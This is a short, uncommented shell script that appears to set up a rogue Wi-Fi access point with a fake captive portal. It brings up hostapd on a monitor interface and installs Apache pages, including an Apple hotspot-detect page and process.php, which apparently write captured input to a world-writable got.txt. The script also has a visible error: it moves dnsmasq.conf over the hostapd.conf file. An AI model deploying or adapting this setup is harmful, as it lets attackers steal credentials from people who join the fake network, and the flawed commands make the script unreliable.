mv hostapd.conf /root/home/hostapd.conf
mv dnsmasq.conf /root/home/hostapd.conf
apt-get install hostapd
ifconfig wlan0mon up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
mv 000-default.conf /etc/apache2/sites-available/000-default.conf
mv index.html /var/www/html/index.html
mv hotspot-detect.html /var/www/html/hotspot-detect.html
mv redirect /var/www/html/redirect
mv process.php /var/www/html/process.php
mv success.html /var/www/html/success.html
mv got.txt /var/www/html/got.txt
chmod a+w /var/www/html/got.txt
a2enmod php7.2
systemctl restart apache2
